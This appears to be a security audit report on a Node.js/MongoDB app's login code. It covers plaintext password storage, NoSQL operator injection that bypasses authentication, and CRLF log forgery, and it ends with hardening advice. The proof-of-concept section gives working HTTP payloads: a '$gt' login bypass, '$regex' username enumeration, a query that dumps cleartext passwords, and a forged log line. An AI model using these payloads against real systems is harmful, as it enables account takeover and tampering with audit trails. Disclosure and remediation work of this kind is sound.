## Summary

The authentication subsystem contains three cooperating vulnerabilities that together allow an unauthenticated remote attacker to bypass login, harvest all user credentials without cracking, and forge application logs. The root cause is that bcrypt password hashing and comparison have been commented out in `user-dao.js`, passwords are stored and compared in plaintext, and the `userName` field from `req.body` is passed without type-checking directly to a MongoDB `findOne()` query, enabling NoSQL operator injection. An additional log-injection flaw in `session.js` allows CRLF-based log forgery. All three fixes are commented out with `TODO`-style notes but were never re-enabled.

---

## Vulnerability Details

### 1. Plaintext Password Storage (CWE-256) — Primary

In `addUser()`, the `bcrypt.hashSync` call is explicitly commented out. Passwords are stored verbatim in the MongoDB `users` collection:

```js
// app/data/user-dao.js ~line 30
const user = {
    userName,
    firstName,
    lastName,
    benefitStartDate: this.getRandomFutureDate(),
    password  //received from request param   ← stored as plaintext
    /*
    password: bcrypt.hashSync(password, bcrypt.genSaltSync())  // ← disabled
    */
};
```

In `validateLogin()`, the comparison uses strict string equality instead of bcrypt:

```js
const comparePassword = (fromDB, fromUser) => {
    return fromDB === fromUser;  // ← plaintext comparison
    /*
    return bcrypt.compareSync(fromDB, fromUser);  // ← disabled, and arguments are INVERTED
    */
};
```

> ⚠️ **Bonus defect:** Even the commented-out bcrypt fix has its arguments swapped. `bcrypt.compareSync(plaintext, hash)` requires the plaintext as the first argument, but the commented code passes `fromDB` (the hash) first, meaning re-enabling the comment verbatim would cause all logins to fail.

### 2. NoSQL Injection — Authentication Bypass (CWE-943) — Critical Amplifier

`userName` from `req.body` is passed directly to `usersCol.findOne()` with no type checking:

```js
// app/data/user-dao.js
this.validateLogin = (userName, password, callback) => {
    // No type check — userName may be an object with MongoDB operators
    usersCol.findOne({ userName: userName }, validateUserDoc);
};
```

If the client sends `Content-Type: application/json`, Express body-parser will deserialize the body and `userName` can be a MongoDB query operator object, not a string.

### 3. Log Injection / CRLF Injection (CWE-117) — Tertiary

Unsanitized `userName` is written to the application log on failed login attempts. The ESAPI encoding fix is also commented out:

```js
// app/routes/session.js
console.log("Error: attempt to login with invalid user: ", userName);  // raw, unescaped
// ESAPI.encoder().encodeForHTML(userName)  // ← disabled
```

## Proof of Concept

### PoC 1 — NoSQL Injection Authentication Bypass

Send the following request to obtain a valid session for the first user in the database (typically the admin account, given typical insertion order):

```http
POST /login HTTP/1.1
Host: target.local:4000
Content-Type: application/json

{"userName": {"$gt": ""}, "password": ""}
```

`usersCol.findOne({userName: {"$gt": ""}})` matches the first document in the collection. The `comparePassword` function then performs `"" === user.password` — which fails — but an attacker who also knows (or guesses) any stored password (trivially, since they're plaintext) can supply it directly:

```http
POST /login HTTP/1.1
Host: target.local:4000
Content-Type: application/json

{"userName": {"$gt": ""}, "password": "Password1"}
```

Alternatively, use `$regex` to enumerate usernames character-by-character:

```json
{"userName": {"$regex": "^adm"}, "password": "known_or_guessed"}
```

### PoC 2 — Credential Harvest via Any DB Read

Any attacker with MongoDB read access (e.g., via misconfigured `bind_ip 0.0.0.0`, SSRF to internal Mongo, or backup file) can run:

```js
db.users.find({}, {userName: 1, password: 1, isAdmin: 1})
```

All passwords are returned in cleartext. No offline cracking is required. All accounts are compromised instantly.

### PoC 3 — CRLF Log Injection

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

userName=nonexistent%0d%0aINFO%3a+Successful+login+for+user%3a+admin&password=x
```

The application log will contain a fabricated success entry, poisoning SIEM alerting and audit trails.

## Additional Hardening

1. **Add `express-mongo-sanitize` middleware globally** — strips `$` and `.` from all request body keys before they reach route handlers, providing defense-in-depth against NoSQL injection beyond the type-check fix.

 ```js
 const mongoSanitize = require('express-mongo-sanitize');
 app.use(mongoSanitize());
 ```

2. **Increase bcrypt work factor to ≥ 12** — `bcrypt.genSaltSync()` defaults to 10 rounds. Use `bcrypt.genSaltSync(12)` at minimum. Implement automatic re-hashing on login if the stored hash's cost factor is below the current threshold.

3. **Implement account lockout** — after 5 consecutive failed login attempts, temporarily lock the account (e.g., 15 minutes) and alert on the event. This mitigates brute-force even against bcrypt-hashed passwords.

4. **Structured logging** — replace raw `console.log` with a structured logger (e.g., `pino`, `winston`) that automatically escapes control characters, preventing log injection at the framework level rather than per call-site.

5. **Input length limits** — enforce maximum length on `userName` and `password` fields at the route level to prevent ReDoS against any regex-based validation and reduce bcrypt timing amplification on very long inputs.
